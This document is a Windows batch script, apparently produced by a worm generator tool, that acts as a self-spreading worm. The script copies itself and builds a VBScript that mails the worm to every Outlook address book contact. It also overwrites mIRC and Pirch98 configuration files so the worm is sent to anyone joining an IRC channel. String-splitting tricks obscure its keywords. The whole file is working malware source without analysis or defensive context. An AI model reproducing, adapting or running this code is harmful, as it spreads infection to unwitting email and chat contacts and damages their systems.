@echo off
REM Name:1
REM Author: 1 
REM generated with BATCH WORM GENERATOR 2.03
ctty nul
Set MyS=%0
copy %MyS% 1
copy 1 C:\y
copy 1 C:\jwokr.vbs
echo Dim x > C:\jwokr.vbs
set VBSwayA=resume
echo.on error %VBSwayA% next >> C:\jwokr.vbs
set VBSwayA=
echo Set fso =" Scripting.FileSystem.Object" >> C:\jwokr.vbs
echo Set so=CreateObject(fso) >> C:\jwokr.vbs
set VBSwayI=Outlook
echo Set ol=CreateObject("%VBSwayI%.Application") >> C:\jwokr.vbs
set VBSwayI=
set VBSwayJ=WScript
echo Set out=%VBSwayJ%.CreateObject("Outlook.Application") >> C:\jwokr.vbs
set VBSwayJ=
echo Set mapi = out.GetNameSpace("MAPI") >> C:\jwokr.vbs
echo Set a = mapi.AddressLists(1) >> C:\jwokr.vbs
echo Set ae=a.AddressEntries >> C:\jwokr.vbs
echo For x=1 To ae.Count >> C:\jwokr.vbs
echo Set ci=ol.CreateItem(0) >> C:\jwokr.vbs
echo Set Mail=ci >> C:\jwokr.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\jwokr.vbs
set VBSwayK=Mail
echo %VBSwayK%.Subject="y" >> C:\jwokr.vbs
set VBSwayK=
echo Mail.Body="y" >> C:\jwokr.vbs
echo Mail.Attachments.Add("C:\y") >> C:\jwokr.vbs
echo Mail.Send >> C:\jwokr.vbs
echo Next >> C:\jwokr.vbs
echo ol.Quit >> C:\jwokr.vbs
cscript C:\jwokr.vbs
del C:\jwokr.vbs
del C:\y
md C:\pro
copy 1 C:\pro\y
if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini
if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini
set ircc=send
set spp=dcc %ircc% $nick C:\pro\yecho [script] > %mIRC%
set ircb=on
echo n0=%ircb% 1:join:*.*: { if ( $nick !=$me ) /%spp% } >>%mIRC%
if exist C:\pirch98\events.ini goto pir
goto pirend
:pir
copy 1 %WinDir%\y
set pif=Lev
echo [%pif%els] > C:\Pirch98\events.ini
echo Enabled=1 >> C:\Pirch98\events.ini
echo Count=6 >> C:\Pirch98\events.ini
set pii=Unknows
echo Level1=000-%pii% >> C:\Pirch98\events.ini
echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini
echo Level2=100-Level 100 >> C:\Pirch98\events.ini
set pil=En
echo 100-Level 100%pil%abled=1 >> C:\Pirch98\events.ini
set pim=ve
echo Le%pim%l3=200-Level 200 >> C:\Pirch98\events.ini
echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini
set pio=vel4
echo Le%pio%=300-Level 300 >> C:\Pirch98\events.ini
set pip=300
echo %pip%-Level 300Enabled=1 >> C:\Pirch98\events.ini
echo Level5=400-Level 400 >> C:\Pirch98\events.ini
set pir=0En
echo 400-Level 40%pir%abled=1 >> C:\Pirch98\events.ini
echo Level6=500-Level 500 >> C:\Pirch98\events.ini
echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini
set pia=000
echo [%pia%-Unknowns] >> C:\Pirch98\events.ini
set pib=Use
echo %pib%r1=*!*@* >> C:\Pirch98\events.ini
echo UserCount=1 >> C:\Pirch98\events.ini
set pid=ON JOIN
echo Events1= %pid%:#: /dcc send $nick %WinDir%\y >> C:\Pirch98\events.ini
echo EventCount=1 >> C:\Pirch98\events.ini
echo [100-Level 100] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [200-Level 200] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [300-Level 300] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [400-Level 400] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [500-Level 500] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
